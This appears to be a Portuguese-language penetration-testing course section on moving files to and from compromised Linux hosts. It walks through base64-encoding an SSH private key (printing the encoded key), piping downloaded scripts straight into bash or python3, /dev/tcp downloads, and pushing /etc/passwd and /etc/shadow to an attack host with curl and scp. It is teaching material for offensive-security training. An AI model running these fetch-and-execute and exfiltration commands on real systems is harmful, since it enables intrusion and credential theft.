O Linux é um sistema operacional versátil, que geralmente possui muitas ferramentas diferentes que podemos usar para executar transferências de arquivos. Compreender os métodos de transferência de arquivos no Linux pode ajudar invasores e defensores a melhorar suas habilidades para atacar redes e impedir ataques sofisticados.

Alguns anos atrás, fomos contatados para executar a resposta a incidentes em alguns servidores da web. Encontramos vários atores de ameaças em seis dos nove servidores da web que investigamos. O ator da ameaça encontrou uma vulnerabilidade de injeção de SQL. Eles usaram um script Bash que, quando executado, tentou baixar outro malware que se conectava ao servidor de comando e controle do ator de ameaças.

O script Bash usado tentou três métodos de download para obter a outra peça de malware conectada ao servidor de comando e controle. Sua primeira tentativa foi usar `cURL`. Se isso falhou, ele tentou usar `wget`, e se isso falhou, ele usou `Python`. Todos os três métodos usam comunicação `HTTP`.

Embora o Linux possa se comunicar via FTP, SMB como o Windows, a maioria dos malwares em todos os diferentes sistemas operacionais usa `HTTP` e `HTTPS` para comunicação.

Esta seção analisará várias maneiras de transferir arquivos no Linux, incluindo HTTP, Bash, SSH, etc.

## Download de operações

Temos acesso à máquina `NIX04`, e precisamos baixar um arquivo da nossa máquina `Pwnbox`. Vamos ver como podemos conseguir isso usando vários métodos de download de arquivos.

![[Pasted image 20230703142614.png]]

## Codificação / decodificação Base64

Dependendo do tamanho do arquivo que queremos transferir, podemos usar um método que não requer comunicação em rede. Se tivermos acesso a um terminal, podemos codificar um arquivo em uma sequência base64, copiar seu conteúdo no terminal e executar a operação reversa. Vamos ver como podemos fazer isso com Bash.

#### Pwnbox - Verifique o arquivo MD5 hash

```shell-session
casluxd@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

Nós usamos `cat` para imprimir o conteúdo do arquivo e base64 codificar a saída usando um pipe `|`. Usamos a opção `-w 0` para criar apenas uma linha e acabou com o comando com um ponto e vírgula (; ) e `echo` palavra-chave para iniciar uma nova linha e facilitar a cópia.

#### Pwnbox - codifique a chave SSH para Base64

```shell-session
casluxd@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

Copiamos esse conteúdo, colamos no nosso aparelho de destino Linux e usamos `base64` com a opção `-d 'para decodificá-lo.

```shell-session
casluxd@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

Por fim, podemos confirmar se o arquivo foi transferido com sucesso usando o `md5sum` comando.

#### Linux - Confirme a correspondência de hashes MD5

```shell-session
casluxd@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

**Nota:** Você também pode fazer upload de arquivos usando a operação reversa. Do seu gato de destino comprometido e base64, codifique um arquivo e decodifique-o no seu Pwnbox.

## Downloads da Web com Wget e cURL

Dois dos utilitários mais comuns nas distribuições Linux para interagir com aplicativos da web são `wget` e `curl`. Essas ferramentas são instaladas em muitas distribuições Linux.

Para baixar um arquivo usando `wget`, precisamos especificar o URL e a opção `-O 'para definir o nome do arquivo de saída.

#### Baixe um arquivo usando o wget

```shell-session
casluxd@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL` é muito parecido com `wget`, mas a opção de nome do arquivo de saída é `-o 'em minúscula'.

#### Faça o download de um arquivo usando o cURL

```shell-session
casluxd@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Ataques sem arquivo usando o Linux

Por causa da maneira como o Linux funciona e como [tubos operam](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), a maioria das ferramentas que usamos no Linux pode ser usada para replicar operações sem arquivos, o que significa que não precisamos baixar um arquivo para executá-lo.

**Nota:** Algumas cargas úteis, como `mkfifo` escreve arquivos para o disco. Lembre-se de que, embora a execução da carga útil possa ser sem arquivos ao usar um tubo, dependendo da carga útil escolhida, ela pode criar arquivos temporários no sistema operacional.

Vamos pegar o comando `cURL` que usamos e, em vez de baixar LinEnum.sh, vamos executá-lo diretamente usando um pipe.

```shell-session
casluxd@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Da mesma forma, podemos baixar um arquivo de script Python de um servidor da web e colocá-lo no binário Python. Vamos fazer isso, desta vez usando `wget`.

#### Download sem arquivo com wget

```shell-session
casluxd@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

## Faça o download com Bash ( / dev / tcp )

Também pode haver situações em que nenhuma das ferramentas conhecidas de transferência de arquivos esteja disponível. Desde que o Bash versão 2.04 ou superior esteja instalado ( compilado com --enable-net-redirections ), o arquivo do dispositivo embutido / dev / TCP pode ser usado para downloads simples de arquivos.

#### Conecte-se ao servidor da Web de destino

```shell-session
casluxd@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### Solicitação de GET HTTP

```shell-session
casluxd@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Imprima a resposta

```shell-session
casluxd@htb[/htb]$ cat <&3
```

## Downloads SSH

SSH ( ou Secure Shell ) é um protocolo que permite acesso seguro a computadores remotos. A implementação do SSH vem com um `SCP` utilitário para transferência remota de arquivo que, por padrão, usa o protocolo SSH.

`SCP`( copy secure ) é um utilitário de linha de comando que permite copiar arquivos e diretórios entre dois hosts com segurança. Podemos copiar nossos arquivos de servidores locais para servidores remotos e de servidores remotos para nossa máquina local.

`SCP` é muito parecido com `copy` ou `cp`, mas em vez de fornecer um caminho local, precisamos especificar um nome de usuário, o endereço IP remoto ou o nome DNS e as credenciais do usuário.

Antes de começarmos a baixar arquivos da nossa máquina Linux de destino para o nosso Pwnbox, vamos configurar um servidor SSH no nosso Pwnbox.

#### Ativando o servidor SSH

```shell-session
casluxd@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

#### Iniciando o servidor SSH

```shell-session
casluxd@htb[/htb]$ sudo systemctl start ssh
```

#### Verificando a porta de escuta SSH

```shell-session
casluxd@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

Agora podemos começar a transferir arquivos. Precisamos especificar o endereço IP do nosso Pwnbox e o nome de usuário e senha.

#### Linux - Download de arquivos usando SCP

```shell-session
casluxd@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

`**Nota:** Você pode criar uma conta de usuário temporária para transferências de arquivos e evitar o uso de suas credenciais ou chaves primárias em um computador remoto.`

## Operações de upload

Também existem situações como exploração binária e análise de captura de pacotes, nas quais devemos carregar arquivos de nossa máquina de destino no host de ataque. Os métodos que usamos para downloads também funcionarão para uploads. Vamos ver como podemos fazer upload de arquivos de várias maneiras.

## Upload da Web

Como mencionado no `Windows File Transfer Methods` seção, podemos usar [uploadserver](https://github.com/Densaugeo/uploadserver), um módulo estendido do Python módulo `HTTP.Server`, que inclui uma página de upload de arquivo. Para este exemplo do Linux, vamos ver como podemos configurar o `uploadserver` módulo a usar `HTTPS` para comunicação segura.

A primeira coisa que precisamos fazer é instalar o módulo `uploadserver`.

#### Pwnbox - Iniciar servidor Web

```shell-session
casluxd@htb[/htb]$ python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Agora precisamos criar um certificado. Neste exemplo, estamos usando um certificado autoassinado.

```shell-session
casluxd@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

O servidor da web não deve hospedar o certificado. Recomendamos a criação de um novo diretório para hospedar o arquivo do nosso servidor da web.

#### Pwnbox - Iniciar servidor Web

```shell-session
casluxd@htb[/htb]$ mkdir https && cd https
```

```shell-session
casluxd@htb[/htb]$ python3 -m uploadserver 443 --server-certificate /root/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Agora, da nossa máquina comprometida, vamos fazer o upload dos arquivos `/etc/passwd` e `/etc/shadow`.

#### Linux - Carregar vários arquivos

```shell-session
casluxd@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Usamos a opção `--insecure` porque usamos um certificado autoassinado em que confiamos.

## Método alternativo de transferência de arquivos da Web

Como as distribuições Linux geralmente têm `Python` ou `php` instalado, iniciar um servidor da web para transferir arquivos é simples. Além disso, se o servidor que comprometemos for um servidor da web, podemos mover os arquivos que queremos transferir para o diretório do servidor da web e acessá-los na página da web, o que significa que estamos baixando o arquivo do nosso Pwnbox.

É possível exibir um servidor da web usando vários idiomas. Uma máquina Linux comprometida pode não ter um servidor web instalado. Nesses casos, podemos usar um mini servidor web. O que eles talvez não tenham em segurança, compensam a flexibilidade, pois o local da web e as portas de escuta podem ser rapidamente alterados.

#### Linux - Criando um servidor Web com Python3

```shell-session
casluxd@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - Criando um servidor Web com Python2.7

```shell-session
casluxd@htb[/htb]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - Criando um servidor Web com PHP

```shell-session
casluxd@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

#### Linux - Criando um servidor Web com Ruby

```shell-session
casluxd@htb[/htb]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

#### Faça o download do arquivo da máquina de destino no Pwnbox

```shell-session
casluxd@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```

`**Nota:** Quando iniciamos um novo servidor da Web usando Python ou PHP, é importante considerar que o tráfego de entrada pode estar bloqueado. Estamos transferindo um arquivo do nosso destino para o host de ataque, mas não estamos carregando o arquivo.`

## Upload do SCP

Podemos encontrar algumas empresas que permitem a `SSH protocol` ( TCP / 22 ) para conexões de saída e, se for esse o caso, podemos usar um servidor SSH com o utilitário `scp` para carregar arquivos. Vamos tentar fazer upload de um arquivo usando o protocolo SSH.

#### Upload de arquivo usando SCP

```shell-session
casluxd@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/

plaintext@192.168.49.128's password: 
passwd      
```

`**Nota:** Lembre-se de que a sintaxe do scp é semelhante ao cp ou copie.`

